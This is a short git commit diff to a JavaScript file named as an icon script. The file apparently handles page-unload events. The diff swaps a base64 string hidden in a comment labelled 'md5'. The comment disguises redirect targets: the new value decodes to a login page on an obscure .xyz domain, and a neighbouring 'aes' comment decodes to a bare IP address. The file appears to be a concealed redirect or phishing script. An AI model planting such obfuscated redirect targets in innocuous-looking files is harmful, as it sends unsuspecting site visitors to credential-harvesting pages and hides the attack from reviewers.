9326f4f0d7ed13dbea60a3362da9b78275cc846e
unknown <caocaodajun@gmail.com>
2021-06-11 16:00:52 +0800

    init

--- js/icon_kkzq6w.js
+++ js/icon_kkzq6w.js
@@ -8,4 +8,4 @@ if($.browser.mozilla||$.browser.opera)
 		function UnloadHandler() {
 				window.removeEventListener('beforeunload', UnloadHandler, false);
 		}
-})()/** md5:aHR0cHM6Ly9tLmJhaWR1LmNvbQ==**//** aes:aHR0cDovLzE2LjE2Mi4xMDUuMTQ1**/
+})()/** md5:aHR0cHM6Ly9tLmhiZmxycnRvdmd2YzU5Lnh5ei9pbmRleC91c2VyL2xvZ2luLmh0bWw=**//** aes:aHR0cDovLzE2LjE2Mi4xMDUuMTQ1**/
